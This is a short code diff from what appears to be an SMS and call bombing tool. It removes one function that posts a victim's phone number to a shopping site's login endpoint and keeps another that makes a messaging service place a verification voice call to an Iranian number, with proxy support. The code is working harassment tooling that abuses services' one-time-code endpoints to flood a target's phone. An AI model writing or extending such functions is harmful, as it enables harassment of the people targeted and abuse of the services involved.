@@ -1750,12 +1750,6 @@ def mrbilitcall(num, proxies):
     )    
 
 @handler.call_api
-def tezolmarket(num, proxies):
-    persian = get(f"https://api.codebazan.ir/adad/?text={num}").json()
-    get('https://www.tezolmarket.com/Account/Login',
-            f'PhoneNumber=۰{persian["result"]["fa"]}&SendCodeProcedure=1')
-
-@handler.call_api
 def gap(num, proxies):
     get(proxies=proxies, url=f'https://core.gap.im/v1/user/resendCode.json?mobile=%2B98{num}&type=IVR')
 
